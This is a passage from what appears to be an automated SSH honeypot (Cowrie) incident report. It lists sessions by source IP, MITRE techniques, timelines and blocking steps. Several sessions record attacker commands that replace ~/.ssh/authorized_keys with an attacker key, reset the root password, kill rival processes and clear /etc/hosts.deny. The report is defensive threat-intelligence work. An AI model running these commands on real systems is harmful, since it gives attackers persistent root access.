|---|---|
| `2026-04-28 08:09:38` | `cowrie.session.connect` |
| `2026-04-28 08:09:38` | `cowrie.client.version` |
| `2026-04-28 08:09:38` | `cowrie.client.kex` |
| `2026-04-28 08:09:39` | `cowrie.login.success` |
| `2026-04-28 08:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.43.83[.]43` to AbuseIPDB if not already reported
- [ ] Block `177.43.83[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e41e8d7cc81

| Field | Detail |
|---|---|
| **Source IP** | `106.75.222[.]164` |
| **First Seen** | 2026-04-28 08:09 |
| **Last Seen** | 2026-04-28 08:10 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:KiTO67xxhV2N"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 08:09:47` | `cowrie.session.connect` |
| `2026-04-28 08:09:47` | `cowrie.client.version` |
| `2026-04-28 08:09:47` | `cowrie.client.kex` |
| `2026-04-28 08:09:47` | `cowrie.login.success` |
| `2026-04-28 08:09:48` | `cowrie.session.params` |
| `2026-04-28 08:09:48` | `cowrie.command.input` |
| `2026-04-28 08:09:48` | `cowrie.command.failed` |
| `2026-04-28 08:09:48` | `cowrie.log.closed` |
| `2026-04-28 08:09:48` | `cowrie.session.params` |
| `2026-04-28 08:09:48` | `cowrie.command.input` |
| `2026-04-28 08:09:48` | `cowrie.session.file_download` |
| `2026-04-28 08:09:48` | `cowrie.log.closed` |
| `2026-04-28 08:10:02` | `cowrie.session.params` |
| `2026-04-28 08:10:02` | `cowrie.command.input` |
| `2026-04-28 08:10:02` | `cowrie.log.closed` |
| `2026-04-28 08:10:02` | `cowrie.session.params` |
| `2026-04-28 08:10:02` | `cowrie.command.input` |
| `2026-04-28 08:10:02` | `cowrie.log.closed` |
| `2026-04-28 08:10:03` | `cowrie.session.params` |
| `2026-04-28 08:10:03` | `cowrie.command.input` |
| `2026-04-28 08:10:03` | `cowrie.session.file_download` |
| `2026-04-28 08:10:03` | `cowrie.log.closed` |
| `2026-04-28 08:10:03` | `cowrie.session.params` |
| `2026-04-28 08:10:03` | `cowrie.command.input` |
| `2026-04-28 08:10:03` | `cowrie.log.closed` |
| `2026-04-28 08:10:04` | `cowrie.session.params` |
| `2026-04-28 08:10:04` | `cowrie.command.input` |
| `2026-04-28 08:10:04` | `cowrie.log.closed` |
| `2026-04-28 08:10:04` | `cowrie.session.params` |
| `2026-04-28 08:10:04` | `cowrie.command.input` |
| `2026-04-28 08:10:04` | `cowrie.command.input` |
| `2026-04-28 08:10:04` | `cowrie.log.closed` |
| `2026-04-28 08:10:04` | `cowrie.session.params` |
| `2026-04-28 08:10:04` | `cowrie.command.input` |
| `2026-04-28 08:10:05` | `cowrie.log.closed` |
| `2026-04-28 08:10:05` | `cowrie.session.params` |
| `2026-04-28 08:10:05` | `cowrie.command.input` |
| `2026-04-28 08:10:05` | `cowrie.log.closed` |
| `2026-04-28 08:10:05` | `cowrie.session.params` |
| `2026-04-28 08:10:05` | `cowrie.command.input` |
| `2026-04-28 08:10:05` | `cowrie.log.closed` |
| `2026-04-28 08:10:06` | `cowrie.session.params` |
| `2026-04-28 08:10:06` | `cowrie.command.input` |
| `2026-04-28 08:10:06` | `cowrie.log.closed` |
| `2026-04-28 08:10:06` | `cowrie.session.params` |
| `2026-04-28 08:10:06` | `cowrie.command.input` |
| `2026-04-28 08:10:06` | `cowrie.log.closed` |
| `2026-04-28 08:10:07` | `cowrie.session.params` |
| `2026-04-28 08:10:07` | `cowrie.command.input` |
| `2026-04-28 08:10:07` | `cowrie.log.closed` |
| `2026-04-28 08:10:07` | `cowrie.session.params` |
| `2026-04-28 08:10:07` | `cowrie.command.input` |
| `2026-04-28 08:10:07` | `cowrie.log.closed` |
| `2026-04-28 08:10:08` | `cowrie.session.params` |
| `2026-04-28 08:10:08` | `cowrie.command.input` |
| `2026-04-28 08:10:08` | `cowrie.log.closed` |
| `2026-04-28 08:10:08` | `cowrie.session.params` |
| `2026-04-28 08:10:08` | `cowrie.command.input` |
| `2026-04-28 08:10:08` | `cowrie.log.closed` |
| `2026-04-28 08:10:09` | `cowrie.session.params` |
| `2026-04-28 08:10:09` | `cowrie.command.input` |
| `2026-04-28 08:10:09` | `cowrie.log.closed` |
| `2026-04-28 08:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.222[.]164` to AbuseIPDB if not already reported
- [ ] Block `106.75.222[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cdeaca90f36

| Field | Detail |
|---|---|
| **Source IP** | `106.75.222[.]164` |
| **First Seen** | 2026-04-28 08:11 |
| **Last Seen** | 2026-04-28 08:12 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:VdTa0FS6LCuV"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 08:11:52` | `cowrie.session.connect` |
| `2026-04-28 08:11:52` | `cowrie.client.version` |
| `2026-04-28 08:11:52` | `cowrie.client.kex` |
| `2026-04-28 08:11:52` | `cowrie.login.success` |
| `2026-04-28 08:11:53` | `cowrie.session.params` |
| `2026-04-28 08:11:53` | `cowrie.command.input` |
| `2026-04-28 08:11:53` | `cowrie.command.failed` |
| `2026-04-28 08:11:53` | `cowrie.log.closed` |
| `2026-04-28 08:11:53` | `cowrie.session.params` |
| `2026-04-28 08:11:53` | `cowrie.command.input` |
| `2026-04-28 08:11:53` | `cowrie.session.file_download` |
| `2026-04-28 08:11:53` | `cowrie.log.closed` |
| `2026-04-28 08:12:07` | `cowrie.session.params` |
| `2026-04-28 08:12:07` | `cowrie.command.input` |
| `2026-04-28 08:12:07` | `cowrie.log.closed` |
| `2026-04-28 08:12:07` | `cowrie.session.params` |
| `2026-04-28 08:12:07` | `cowrie.command.input` |
| `2026-04-28 08:12:07` | `cowrie.log.closed` |
| `2026-04-28 08:12:08` | `cowrie.session.params` |
| `2026-04-28 08:12:08` | `cowrie.command.input` |
| `2026-04-28 08:12:08` | `cowrie.session.file_download` |
| `2026-04-28 08:12:08` | `cowrie.log.closed` |
| `2026-04-28 08:12:08` | `cowrie.session.params` |
| `2026-04-28 08:12:08` | `cowrie.command.input` |
| `2026-04-28 08:12:08` | `cowrie.log.closed` |
| `2026-04-28 08:12:09` | `cowrie.session.params` |
| `2026-04-28 08:12:09` | `cowrie.command.input` |
| `2026-04-28 08:12:09` | `cowrie.log.closed` |
| `2026-04-28 08:12:09` | `cowrie.session.params` |
| `2026-04-28 08:12:09` | `cowrie.command.input` |
| `2026-04-28 08:12:09` | `cowrie.command.input` |
| `2026-04-28 08:12:09` | `cowrie.log.closed` |
| `2026-04-28 08:12:10` | `cowrie.session.params` |
| `2026-04-28 08:12:10` | `cowrie.command.input` |
| `2026-04-28 08:12:10` | `cowrie.log.closed` |
| `2026-04-28 08:12:10` | `cowrie.session.params` |
| `2026-04-28 08:12:10` | `cowrie.command.input` |
| `2026-04-28 08:12:10` | `cowrie.log.closed` |
| `2026-04-28 08:12:10` | `cowrie.session.params` |
| `2026-04-28 08:12:10` | `cowrie.command.input` |
| `2026-04-28 08:12:11` | `cowrie.log.closed` |
| `2026-04-28 08:12:11` | `cowrie.session.params` |
| `2026-04-28 08:12:11` | `cowrie.command.input` |
| `2026-04-28 08:12:11` | `cowrie.log.closed` |
| `2026-04-28 08:12:11` | `cowrie.session.params` |
| `2026-04-28 08:12:11` | `cowrie.command.input` |
| `2026-04-28 08:12:12` | `cowrie.log.closed` |
| `2026-04-28 08:12:12` | `cowrie.session.params` |
| `2026-04-28 08:12:12` | `cowrie.command.input` |
| `2026-04-28 08:12:12` | `cowrie.log.closed` |
| `2026-04-28 08:12:12` | `cowrie.session.params` |
| `2026-04-28 08:12:12` | `cowrie.command.input` |
| `2026-04-28 08:12:13` | `cowrie.log.closed` |
| `2026-04-28 08:12:13` | `cowrie.session.params` |
| `2026-04-28 08:12:13` | `cowrie.command.input` |
| `2026-04-28 08:12:13` | `cowrie.log.closed` |
| `2026-04-28 08:12:13` | `cowrie.session.params` |
| `2026-04-28 08:12:13` | `cowrie.command.input` |
| `2026-04-28 08:12:13` | `cowrie.log.closed` |
| `2026-04-28 08:12:14` | `cowrie.session.params` |
| `2026-04-28 08:12:14` | `cowrie.command.input` |
| `2026-04-28 08:12:14` | `cowrie.log.closed` |
| `2026-04-28 08:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.222[.]164` to AbuseIPDB if not already reported
- [ ] Block `106.75.222[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63bb8913c738

| Field | Detail |
|---|---|
| **Source IP** | `14.224.213[.]222` |
| **First Seen** | 2026-04-28 09:48 |
| **Last Seen** | 2026-04-28 09:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 09:48:45` | `cowrie.session.connect` |
| `2026-04-28 09:48:45` | `cowrie.client.version` |
| `2026-04-28 09:48:45` | `cowrie.client.kex` |
| `2026-04-28 09:48:46` | `cowrie.login.success` |
| `2026-04-28 09:48:46` | `cowrie.session.params` |
| `2026-04-28 09:48:46` | `cowrie.command.input` |
| `2026-04-28 09:48:46` | `cowrie.command.failed` |
| `2026-04-28 09:48:46` | `cowrie.log.closed` |
| `2026-04-28 09:48:46` | `cowrie.session.params` |
| `2026-04-28 09:48:46` | `cowrie.command.input` |
| `2026-04-28 09:48:46` | `cowrie.session.file_download` |
| `2026-04-28 09:48:46` | `cowrie.log.closed` |
| `2026-04-28 09:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.224.213[.]222` to AbuseIPDB if not already reported
- [ ] Block `14.224.213[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9198546e97c

| Field | Detail |
|---|---|
| **Source IP** | `14.224.213[.]222` |
| **First Seen** | 2026-04-28 09:48 |
| **Last Seen** | 2026-04-28 09:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 09:48:48` | `cowrie.session.connect` |
| `2026-04-28 09:48:48` | `cowrie.client.version` |
| `2026-04-28 09:48:48` | `cowrie.client.kex` |
| `2026-04-28 09:48:49` | `cowrie.login.success` |
| `2026-04-28 09:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.224.213[.]222` to AbuseIPDB if not already reported
- [ ] Block `14.224.213[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79eb1d3ad775

| Field | Detail |
|---|---|
| **Source IP** | `24.19.160[.]116` |
| **First Seen** | 2026-04-28 10:13 |
| **Last Seen** | 2026-04-28 10:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:13:16` | `cowrie.session.connect` |
| `2026-04-28 10:13:16` | `cowrie.client.version` |
| `2026-04-28 10:13:17` | `cowrie.client.kex` |
| `2026-04-28 10:13:18` | `cowrie.login.success` |
| `2026-04-28 10:13:19` | `cowrie.session.params` |
| `2026-04-28 10:13:19` | `cowrie.command.input` |
| `2026-04-28 10:13:19` | `cowrie.command.failed` |
| `2026-04-28 10:13:19` | `cowrie.log.closed` |
| `2026-04-28 10:13:19` | `cowrie.session.params` |
| `2026-04-28 10:13:19` | `cowrie.command.input` |
| `2026-04-28 10:13:20` | `cowrie.session.file_download` |
| `2026-04-28 10:13:20` | `cowrie.log.closed` |
| `2026-04-28 10:13:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.19.160[.]116` to AbuseIPDB if not already reported
- [ ] Block `24.19.160[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6e72a872975

| Field | Detail |
|---|---|
| **Source IP** | `24.19.160[.]116` |
| **First Seen** | 2026-04-28 10:13 |
| **Last Seen** | 2026-04-28 10:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:13:23` | `cowrie.session.connect` |
| `2026-04-28 10:13:23` | `cowrie.client.version` |
| `2026-04-28 10:13:24` | `cowrie.client.kex` |
| `2026-04-28 10:13:25` | `cowrie.login.success` |
| `2026-04-28 10:13:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.19.160[.]116` to AbuseIPDB if not already reported
- [ ] Block `24.19.160[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97314664ace

| Field | Detail |
|---|---|
| **Source IP** | `152.32.218[.]149` |
| **First Seen** | 2026-04-28 10:15 |
| **Last Seen** | 2026-04-28 10:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:15:36` | `cowrie.session.connect` |
| `2026-04-28 10:15:36` | `cowrie.client.version` |
| `2026-04-28 10:15:36` | `cowrie.client.kex` |
| `2026-04-28 10:15:37` | `cowrie.login.success` |
| `2026-04-28 10:15:37` | `cowrie.session.params` |
| `2026-04-28 10:15:37` | `cowrie.command.input` |
| `2026-04-28 10:15:37` | `cowrie.command.failed` |
| `2026-04-28 10:15:37` | `cowrie.log.closed` |
| `2026-04-28 10:15:37` | `cowrie.session.params` |
| `2026-04-28 10:15:37` | `cowrie.command.input` |
| `2026-04-28 10:15:37` | `cowrie.session.file_download` |
| `2026-04-28 10:15:37` | `cowrie.log.closed` |
| `2026-04-28 10:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `152.32.218[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-294c74d086bc

| Field | Detail |
|---|---|
| **Source IP** | `152.32.218[.]149` |
| **First Seen** | 2026-04-28 10:15 |
| **Last Seen** | 2026-04-28 10:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:15:39` | `cowrie.session.connect` |
| `2026-04-28 10:15:39` | `cowrie.client.version` |
| `2026-04-28 10:15:39` | `cowrie.client.kex` |
| `2026-04-28 10:15:40` | `cowrie.login.success` |
| `2026-04-28 10:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.218[.]149` to AbuseIPDB if not already reported
- [ ] Block `152.32.218[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e266054ce144

| Field | Detail |
|---|---|
| **Source IP** | `84.201.243[.]44` |
| **First Seen** | 2026-04-28 10:17 |
| **Last Seen** | 2026-04-28 10:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:17:48` | `cowrie.session.connect` |
| `2026-04-28 10:17:48` | `cowrie.client.version` |
| `2026-04-28 10:17:48` | `cowrie.client.kex` |
| `2026-04-28 10:17:49` | `cowrie.login.success` |
| `2026-04-28 10:17:49` | `cowrie.session.params` |
| `2026-04-28 10:17:49` | `cowrie.command.input` |
| `2026-04-28 10:17:49` | `cowrie.command.failed` |
| `2026-04-28 10:17:49` | `cowrie.log.closed` |
| `2026-04-28 10:17:50` | `cowrie.session.params` |
| `2026-04-28 10:17:50` | `cowrie.command.input` |
| `2026-04-28 10:17:50` | `cowrie.session.file_download` |
| `2026-04-28 10:17:50` | `cowrie.log.closed` |
| `2026-04-28 10:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.201.243[.]44` to AbuseIPDB if not already reported
- [ ] Block `84.201.243[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee3cf7078dfc

| Field | Detail |
|---|---|
| **Source IP** | `84.201.243[.]44` |
| **First Seen** | 2026-04-28 10:17 |
| **Last Seen** | 2026-04-28 10:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:17:53` | `cowrie.session.connect` |
| `2026-04-28 10:17:53` | `cowrie.client.version` |
| `2026-04-28 10:17:53` | `cowrie.client.kex` |
| `2026-04-28 10:17:54` | `cowrie.login.success` |
| `2026-04-28 10:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.201.243[.]44` to AbuseIPDB if not already reported
- [ ] Block `84.201.243[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `35.205.77[.]107` | **32** | 2026-04-28 07:08 | 2026-04-28 07:09 | 3m | 4 | `T1110.001` | 🟠 MEDIUM |
| `152.110.149[.]210` | **24** | 2026-04-28 07:43 | 2026-04-28 07:59 | 48m | 0 | `T1592` | 🟠 MEDIUM |
| `106.75.222[.]164` | **16** | 2026-04-28 07:49 | 2026-04-28 08:33 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `177.65.107[.]71` | **9** | 2026-04-28 07:16 | 2026-04-28 07:25 | 18m | 0 | `T1592` | 🟢 LOW |
| `177.96.5[.]199` | **7** | 2026-04-28 06:53 | 2026-04-28 07:03 | 14m | 0 | `T1592` | 🟢 LOW |
| `99.227.226[.]242` | **6** | 2026-04-28 06:37 | 2026-04-28 06:41 | 3m | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-04-28 08:26 | 2026-04-28 08:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]149` | **2** | 2026-04-28 09:05 | 2026-04-28 09:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.170.65[.]169` | 1 | 2026-04-28 07:31 | 2026-04-28 07:31 | 2s | 0 | `T1592` | 🟢 LOW |
| `110.239.88[.]219` | 1 | 2026-04-28 07:46 | 2026-04-28 07:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.132.249[.]164` | 1 | 2026-04-28 07:24 | 2026-04-28 07:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.141.171[.]139` | 1 | 2026-04-28 10:11 | 2026-04-28 10:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.220.176[.]69` | 1 | 2026-04-28 10:10 | 2026-04-28 10:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.151.72[.]155` | 1 | 2026-04-28 06:52 | 2026-04-28 06:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.193.190[.]100` | 1 | 2026-04-28 07:51 | 2026-04-28 07:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `132.248.44[.]87` | 1 | 2026-04-28 10:06 | 2026-04-28 10:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]218` | 1 | 2026-04-28 06:34 | 2026-04-28 06:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]234` | 1 | 2026-04-28 06:46 | 2026-04-28 06:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]138` | 1 | 2026-04-28 07:44 | 2026-04-28 07:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.116.189[.]74` | 1 | 2026-04-28 07:45 | 2026-04-28 07:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.224.213[.]222` | 1 | 2026-04-28 09:48 | 2026-04-28 09:48 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `150.139.201[.]247` | 1 | 2026-04-28 07:45 | 2026-04-28 07:47 | 120s | 0 | `T1592` | 🟢 LOW |
